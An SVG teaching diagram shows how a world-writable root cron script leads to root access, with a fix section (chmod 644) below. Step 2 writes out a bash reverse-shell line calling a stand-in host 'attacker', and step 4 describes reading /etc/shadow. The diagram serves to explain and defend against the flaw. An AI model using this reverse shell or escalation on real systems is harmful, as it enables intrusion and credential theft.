<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 740 420" font-family="Helvetica, Arial, sans-serif">
  <defs>
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto" markerUnits="strokeWidth">
      <path d="M0,0 L0,6 L9,3 z" fill="#2b2b2b"/>
    </marker>
  </defs>

  <text x="370" y="24" font-size="18" font-weight="bold" fill="#1a1a1a" text-anchor="middle">From Writable Script to Root Shell — and the Fix</text>

  <!-- Step 1 -->
  <rect x="20" y="50" width="200" height="90" rx="6" fill="#f2f4f7" stroke="#2b2b2b" stroke-width="2"/>
  <text x="120" y="75" font-size="14" font-weight="bold" text-anchor="middle" fill="#1a1a1a">1. lowpriv user</text>
  <text x="120" y="95" font-size="12" text-anchor="middle" fill="#1a1a1a">uid=1000</text>
  <text x="120" y="112" font-size="12" text-anchor="middle" fill="#1a1a1a">finds /opt/cleanup.sh</text>
  <text x="120" y="128" font-size="12" text-anchor="middle" fill="#1a1a1a">is -rwxrwxrwx</text>

  <line x1="220" y1="95" x2="270" y2="95" stroke="#2b2b2b" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- Step 2 -->
  <rect x="270" y="50" width="200" height="90" rx="6" fill="#fdecea" stroke="#c0392b" stroke-width="2"/>
  <text x="370" y="75" font-size="14" font-weight="bold" text-anchor="middle" fill="#1a1a1a">2. ATTACKER appends</text>
  <text x="370" y="95" font-size="11" text-anchor="middle" fill="#1a1a1a">bash -i &gt;&amp;</text>
  <text x="370" y="110" font-size="11" text-anchor="middle" fill="#1a1a1a">/dev/tcp/attacker/4444</text>
  <text x="370" y="125" font-size="11" text-anchor="middle" fill="#1a1a1a">0&gt;&amp;1</text>

  <line x1="470" y1="95" x2="520" y2="95" stroke="#2b2b2b" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- Step 3 -->
  <rect x="520" y="50" width="200" height="90" rx="6" fill="#fdecea" stroke="#c0392b" stroke-width="2"/>
  <text x="620" y="75" font-size="14" font-weight="bold" text-anchor="middle" fill="#1a1a1a">3. cron fires (root)</text>
  <text x="620" y="95" font-size="12" text-anchor="middle" fill="#1a1a1a">runs script as root</text>
  <text x="620" y="112" font-size="12" text-anchor="middle" fill="#1a1a1a">reverse shell connects</text>
  <text x="620" y="128" font-size="12" text-anchor="middle" fill="#1a1a1a">OUT to attacker</text>

  <line x1="620" y1="140" x2="620" y2="180" stroke="#2b2b2b" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- Step 4 result -->
  <rect x="420" y="180" width="300" height="80" rx="6" fill="#fdecea" stroke="#c0392b" stroke-width="2"/>
  <text x="570" y="205" font-size="14" font-weight="bold" text-anchor="middle" fill="#1a1a1a">4. RESULT: uid=0(root)</text>
  <text x="570" y="225" font-size="12" text-anchor="middle" fill="#1a1a1a">attacker reads /etc/shadow</text>
  <text x="570" y="243" font-size="12" text-anchor="middle" fill="#1a1a1a">full vertical privilege escalation</text>

  <!-- divider -->
  <line x1="20" y1="290" x2="720" y2="290" stroke="#9aa3ae" stroke-width="1" stroke-dasharray="4,4"/>
  <text x="370" y="310" font-size="15" font-weight="bold" text-anchor="middle" fill="#1a1a1a">THE FIX</text>

  <!-- Fix step 1 -->
  <rect x="60" y="325" width="260" height="75" rx="6" fill="#eafaf1" stroke="#1e8449" stroke-width="2"/>
  <text x="190" y="350" font-size="13" font-weight="bold" text-anchor="middle" fill="#1a1a1a">chmod 644 cleanup.sh</text>
  <text x="190" y="368" font-size="12" text-anchor="middle" fill="#1a1a1a">root: read/write</text>
  <text x="190" y="384" font-size="12" text-anchor="middle" fill="#1a1a1a">everyone else: read-only</text>

  <line x1="320" y1="362" x2="400" y2="362" stroke="#2b2b2b" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- Fix step 2 -->
  <rect x="400" y="325" width="300" height="75" rx="6" fill="#eafaf1" stroke="#1e8449" stroke-width="2"/>
  <text x="550" y="350" font-size="13" font-weight="bold" text-anchor="middle" fill="#1a1a1a">lowpriv retries the write</text>
  <text x="550" y="370" font-size="12" text-anchor="middle" fill="#1a1a1a">"Permission denied"</text>
  <text x="550" y="388" font-size="12" text-anchor="middle" fill="#1a1a1a">escalation path CLOSED</text>
</svg>
